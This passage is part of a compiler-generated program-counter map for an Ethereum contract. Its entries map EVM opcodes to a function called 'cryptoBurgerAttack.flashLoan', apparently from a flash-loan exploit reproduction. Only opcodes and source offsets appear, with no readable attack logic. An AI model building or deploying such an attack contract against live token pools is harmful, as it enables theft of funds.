      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1454,
        1505
      ],
      "op": "MSTORE",
      "path": "0"
    },
    "10138": {
      "op": "PUSH1",
      "value": "0x20"
    },
    "10140": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1454,
        1505
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x4"
    },
    "10142": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1454,
        1505
      ],
      "op": "DUP3",
      "path": "0"
    },
    "10143": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1454,
        1505
      ],
      "op": "ADD",
      "path": "0"
    },
    "10144": {
      "op": "MSTORE"
    },
    "10145": {
      "op": "PUSH1",
      "value": "0x14"
    },
    "10147": {
      "op": "PUSH1",
      "value": "0x24"
    },
    "10149": {
      "op": "DUP3"
    },
    "10150": {
      "op": "ADD"
    },
    "10151": {
      "op": "MSTORE"
    },
    "10152": {
      "op": "PUSH20",
      "value": "0x5061697220646F65736E27742065786973747321"
    },
    "10173": {
      "op": "PUSH1",
      "value": "0x60"
    },
    "10175": {
      "op": "SHL"
    },
    "10176": {
      "op": "PUSH1",
      "value": "0x44"
    },
    "10178": {
      "op": "DUP3"
    },
    "10179": {
      "op": "ADD"
    },
    "10180": {
      "op": "MSTORE"
    },
    "10181": {
      "op": "PUSH1",
      "value": "0x64"
    },
    "10183": {
      "op": "ADD"
    },
    "10184": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1454,
        1505
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x21C"
    },
    "10187": {
      "op": "JUMP"
    },
    "10188": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1454,
        1505
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "10189": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1516,
        1530
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "10191": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1546,
        1550
      ],
      "op": "DUP2",
      "path": "0"
    },
    "10192": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "10194": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "10196": {
      "op": "PUSH1",
      "value": "0xA0"
    },
    "10198": {
      "op": "SHL"
    },
    "10199": {
      "op": "SUB"
    },
    "10200": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1533,
        1558
      ],
      "op": "AND",
      "path": "0"
    },
    "10201": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1533,
        1558
      ],
      "op": "PUSH4",
      "path": "0",
      "value": "0xDFE1681"
    },
    "10206": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1533,
        1560
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "10208": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1533,
        1560
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "10209": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1533,
        1560
      ],
      "op": "DUP2",
      "path": "0"
    },
    "10210": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1533,
        1560
      ],
      "op": "PUSH4",
      "path": "0",
      "value": "0xFFFFFFFF"
    },
    "10215": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1533,
        1560
      ],
      "op": "AND",
      "path": "0"
    },
    "10216": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1533,
        1560
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0xE0"
    },
    "10218": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1533,
        1560
      ],
      "op": "SHL",
      "path": "0"
    },
    "10219": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1533,
        1560
      ],
      "op": "DUP2",
      "path": "0"
    },
    "10220": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1533,
        1560
      ],
      "op": "MSTORE",
      "path": "0"
    },
    "10221": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1533,
        1560
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x4"
    },
    "10223": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1533,
        1560
      ],
      "op": "ADD",
      "path": "0"
    },
    "10224": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1533,
        1560
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x20"
    },
    "10226": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1533,
        1560
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "10228": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1533,
        1560
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "10229": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1533,
        1560
      ],
      "op": "DUP1",
      "path": "0"
    },
    "10230": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1533,
        1560
      ],
      "op": "DUP4",
      "path": "0"
    },
    "10231": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1533,
        1560
      ],
      "op": "SUB",
      "path": "0"
    },
    "10232": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1533,
        1560
      ],
      "op": "DUP2",
      "path": "0"
    },
    "10233": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1533,
        1560
      ],
      "op": "DUP7",
      "path": "0"
    },
    "10234": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1533,
        1560
      ],
      "op": "GAS",
      "path": "0"
    },
    "10235": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1533,
        1560
      ],
      "op": "STATICCALL",
      "path": "0"
    },
    "10236": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1533,
        1560
      ],
      "op": "ISZERO",
      "path": "0"
    },
    "10237": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1533,
        1560
      ],
      "op": "DUP1",
      "path": "0"
    },
    "10238": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1533,
        1560
      ],
      "op": "ISZERO",
      "path": "0"
    },
    "10239": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1533,
        1560
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x280C"
    },
    "10242": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1533,
        1560
      ],
      "op": "JUMPI",
      "path": "0"
    },
    "10243": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1533,
        1560
      ],
      "op": "RETURNDATASIZE",
      "path": "0"
    },
    "10244": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1533,
        1560
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "10246": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1533,
        1560
      ],
      "op": "DUP1",
      "path": "0"
    },
    "10247": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1533,
        1560
      ],
      "op": "RETURNDATACOPY",
      "path": "0"
    },
    "10248": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1533,
        1560
      ],
      "op": "RETURNDATASIZE",
      "path": "0"
    },
    "10249": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1533,
        1560
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "10251": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1533,
        1560
      ],
      "op": "REVERT",
      "path": "0"
    },
    "10252": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1533,
        1560
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "10253": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1533,
        1560
      ],
      "op": "POP",
      "path": "0"
    },
    "10254": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1533,
        1560
      ],
      "op": "POP",
      "path": "0"
    },
    "10255": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1533,
        1560
      ],
      "op": "POP",
      "path": "0"
    },
    "10256": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1533,
        1560
      ],
      "op": "POP",
      "path": "0"
    },
    "10257": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1533,
        1560
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "10259": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1533,
        1560
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "10260": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1533,
        1560
      ],
      "op": "RETURNDATASIZE",
      "path": "0"
    },
    "10261": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1533,
        1560
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x1F"
    },
    "10263": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1533,
        1560
      ],
      "op": "NOT",
      "path": "0"
    },
    "10264": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1533,
        1560
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x1F"
    },
    "10266": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1533,
        1560
      ],
      "op": "DUP3",
      "path": "0"
    },
    "10267": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1533,
        1560
      ],
      "op": "ADD",
      "path": "0"
    },
    "10268": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1533,
        1560
      ],
      "op": "AND",
      "path": "0"
    },
    "10269": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1533,
        1560
      ],
      "op": "DUP3",
      "path": "0"
    },
    "10270": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1533,
        1560
      ],
      "op": "ADD",
      "path": "0"
    },
    "10271": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1533,
        1560
      ],
      "op": "DUP1",
      "path": "0"
    },
    "10272": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1533,
        1560
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "10274": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1533,
        1560
      ],
      "op": "MSTORE",
      "path": "0"
    },
    "10275": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1533,
        1560
      ],
      "op": "POP",
      "path": "0"
    },
    "10276": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1533,
        1560
      ],
      "op": "DUP2",
      "path": "0"
    },
    "10277": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1533,
        1560
      ],
      "op": "ADD",
      "path": "0"
    },
    "10278": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1533,
        1560
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "10279": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1533,
        1560
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x2830"
    },
    "10282": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1533,
        1560
      ],
      "op": "SWAP2",
      "path": "0"
    },
    "10283": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1533,
        1560
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "10284": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1533,
        1560
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x2C59"
    },
    "10287": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "jump": "i",
      "offset": [
        1533,
        1560
      ],
      "op": "JUMP",
      "path": "0"
    },
    "10288": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1533,
        1560
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "10289": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1516,
        1560
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "10290": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1516,
        1560
      ],
      "op": "POP",
      "path": "0"
    },
    "10291": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1570,
        1584
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "10293": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1600,
        1604
      ],
      "op": "DUP3",
      "path": "0"
    },
    "10294": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "10296": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "10298": {
      "op": "PUSH1",
      "value": "0xA0"
    },
    "10300": {
      "op": "SHL"
    },
    "10301": {
      "op": "SUB"
    },
    "10302": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1587,
        1612
      ],
      "op": "AND",
      "path": "0"
    },
    "10303": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1587,
        1612
      ],
      "op": "PUSH4",
      "path": "0",
      "value": "0xD21220A7"
    },
    "10308": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1587,
        1614
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "10310": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1587,
        1614
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "10311": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1587,
        1614
      ],
      "op": "DUP2",
      "path": "0"
    },
    "10312": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1587,
        1614
      ],
      "op": "PUSH4",
      "path": "0",
      "value": "0xFFFFFFFF"
    },
    "10317": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1587,
        1614
      ],
      "op": "AND",
      "path": "0"
    },
    "10318": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1587,
        1614
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0xE0"
    },
    "10320": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1587,
        1614
      ],
      "op": "SHL",
      "path": "0"
    },
    "10321": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1587,
        1614
      ],
      "op": "DUP2",
      "path": "0"
    },
    "10322": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1587,
        1614
      ],
      "op": "MSTORE",
      "path": "0"
    },
    "10323": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1587,
        1614
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x4"
    },
    "10325": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1587,
        1614
      ],
      "op": "ADD",
      "path": "0"
    },
    "10326": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1587,
        1614
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x20"
    },
    "10328": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1587,
        1614
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "10330": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1587,
        1614
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "10331": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1587,
        1614
      ],
      "op": "DUP1",
      "path": "0"
    },
    "10332": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1587,
        1614
      ],
      "op": "DUP4",
      "path": "0"
    },
    "10333": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1587,
        1614
      ],
      "op": "SUB",
      "path": "0"
    },
    "10334": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1587,
        1614
      ],
      "op": "DUP2",
      "path": "0"
    },
    "10335": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1587,
        1614
      ],
      "op": "DUP7",
      "path": "0"
    },
    "10336": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1587,
        1614
      ],
      "op": "GAS",
      "path": "0"
    },
    "10337": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1587,
        1614
      ],
      "op": "STATICCALL",
      "path": "0"
    },
    "10338": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1587,
        1614
      ],
      "op": "ISZERO",
      "path": "0"
    },
    "10339": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1587,
        1614
      ],
      "op": "DUP1",
      "path": "0"
    },
    "10340": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1587,
        1614
      ],
      "op": "ISZERO",
      "path": "0"
    },
    "10341": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1587,
        1614
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x2872"
    },
    "10344": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1587,
        1614
      ],
      "op": "JUMPI",
      "path": "0"
    },
    "10345": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1587,
        1614
      ],
      "op": "RETURNDATASIZE",
      "path": "0"
    },
    "10346": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1587,
        1614
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "10348": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1587,
        1614
      ],
      "op": "DUP1",
      "path": "0"
    },
    "10349": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1587,
        1614
      ],
      "op": "RETURNDATACOPY",
      "path": "0"
    },
    "10350": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1587,
        1614
      ],
      "op": "RETURNDATASIZE",
      "path": "0"
    },
    "10351": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1587,
        1614
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "10353": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1587,
        1614
      ],
      "op": "REVERT",
      "path": "0"
    },
    "10354": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1587,
        1614
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "10355": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1587,
        1614
      ],
      "op": "POP",
      "path": "0"
    },
    "10356": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1587,
        1614
      ],
      "op": "POP",
      "path": "0"
    },
    "10357": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1587,
        1614
      ],
      "op": "POP",
      "path": "0"
    },
    "10358": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1587,
        1614
      ],
      "op": "POP",
      "path": "0"
    },
    "10359": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1587,
        1614
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "10361": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1587,
        1614
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "10362": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1587,
        1614
      ],
      "op": "RETURNDATASIZE",
      "path": "0"
    },
    "10363": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1587,
        1614
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x1F"
    },
    "10365": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1587,
        1614
      ],
      "op": "NOT",
      "path": "0"
    },
    "10366": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1587,
        1614
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x1F"
    },
    "10368": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1587,
        1614
      ],
      "op": "DUP3",
      "path": "0"
    },
    "10369": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1587,
        1614
      ],
      "op": "ADD",
      "path": "0"
    },
    "10370": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1587,
        1614
      ],
      "op": "AND",
      "path": "0"
    },
    "10371": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1587,
        1614
      ],
      "op": "DUP3",
      "path": "0"
    },
    "10372": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1587,
        1614
      ],
      "op": "ADD",
      "path": "0"
    },
    "10373": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1587,
        1614
      ],
      "op": "DUP1",
      "path": "0"
    },
    "10374": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1587,
        1614
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "10376": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1587,
        1614
      ],
      "op": "MSTORE",
      "path": "0"
    },
    "10377": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1587,
        1614
      ],
      "op": "POP",
      "path": "0"
    },
    "10378": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1587,
        1614
      ],
      "op": "DUP2",
      "path": "0"
    },
    "10379": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1587,
        1614
      ],
      "op": "ADD",
      "path": "0"
    },
    "10380": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1587,
        1614
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "10381": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1587,
        1614
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x2896"
    },
    "10384": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1587,
        1614
      ],
      "op": "SWAP2",
      "path": "0"
    },
    "10385": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1587,
        1614
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "10386": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1587,
        1614
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x2C59"
    },
    "10389": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "jump": "i",
      "offset": [
        1587,
        1614
      ],
      "op": "JUMP",
      "path": "0"
    },
    "10390": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1587,
        1614
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "10391": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1570,
        1614
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "10392": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1570,
        1614
      ],
      "op": "POP",
      "path": "0"
    },
    "10393": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1624,
        1642
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "10395": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1661,
        1667
      ],
      "op": "DUP3",
      "path": "0"
    },
    "10396": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "10398": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "10400": {
      "op": "PUSH1",
      "value": "0xA0"
    },
    "10402": {
      "op": "SHL"
    },
    "10403": {
      "op": "SUB"
    },
    "10404": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1645,
        1667
      ],
      "op": "AND",
      "path": "0"
    },
    "10405": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1645,
        1657
      ],
      "op": "DUP7",
      "path": "0"
    },
    "10406": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "10408": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "10410": {
      "op": "PUSH1",
      "value": "0xA0"
    },
    "10412": {
      "op": "SHL"
    },
    "10413": {
      "op": "SUB"
    },
    "10414": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1645,
        1667
      ],
      "op": "AND",
      "path": "0"
    },
    "10415": {
      "branch": 107,
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1645,
        1667
      ],
      "op": "EQ",
      "path": "0"
    },
    "10416": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1645,
        1681
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x28BA"
    },
    "10419": {
      "branch": 107,
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1645,
        1681
      ],
      "op": "JUMPI",
      "path": "0"
    },
    "10420": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1680,
        1681
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "10422": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1645,
        1681
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x28BC"
    },
    "10425": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1645,
        1681
      ],
      "op": "JUMP",
      "path": "0"
    },
    "10426": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1645,
        1681
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "10427": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1670,
        1677
      ],
      "op": "DUP5",
      "path": "0"
    },
    "10428": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1645,
        1681
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "10429": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1624,
        1681
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "10430": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1624,
        1681
      ],
      "op": "POP",
      "path": "0"
    },
    "10431": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1691,
        1709
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "10433": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1728,
        1734
      ],
      "op": "DUP3",
      "path": "0"
    },
    "10434": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "10436": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "10438": {
      "op": "PUSH1",
      "value": "0xA0"
    },
    "10440": {
      "op": "SHL"
    },
    "10441": {
      "op": "SUB"
    },
    "10442": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1712,
        1734
      ],
      "op": "AND",
      "path": "0"
    },
    "10443": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1712,
        1724
      ],
      "op": "DUP8",
      "path": "0"
    },
    "10444": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "10446": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "10448": {
      "op": "PUSH1",
      "value": "0xA0"
    },
    "10450": {
      "op": "SHL"
    },
    "10451": {
      "op": "SUB"
    },
    "10452": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1712,
        1734
      ],
      "op": "AND",
      "path": "0"
    },
    "10453": {
      "branch": 108,
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1712,
        1734
      ],
      "op": "EQ",
      "path": "0"
    },
    "10454": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1712,
        1748
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x28E0"
    },
    "10457": {
      "branch": 108,
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1712,
        1748
      ],
      "op": "JUMPI",
      "path": "0"
    },
    "10458": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1747,
        1748
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "10460": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1712,
        1748
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x28E2"
    },
    "10463": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1712,
        1748
      ],
      "op": "JUMP",
      "path": "0"
    },
    "10464": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1712,
        1748
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "10465": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1737,
        1744
      ],
      "op": "DUP6",
      "path": "0"
    },
    "10466": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1712,
        1748
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "10467": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1691,
        1748
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "10468": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1691,
        1748
      ],
      "op": "POP",
      "path": "0"
    },
    "10469": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1772,
        1776
      ],
      "op": "DUP5",
      "path": "0",
      "statement": 97
    },
    "10470": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "10472": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "10474": {
      "op": "PUSH1",
      "value": "0xA0"
    },
    "10476": {
      "op": "SHL"
    },
    "10477": {
      "op": "SUB"
    },
    "10478": {
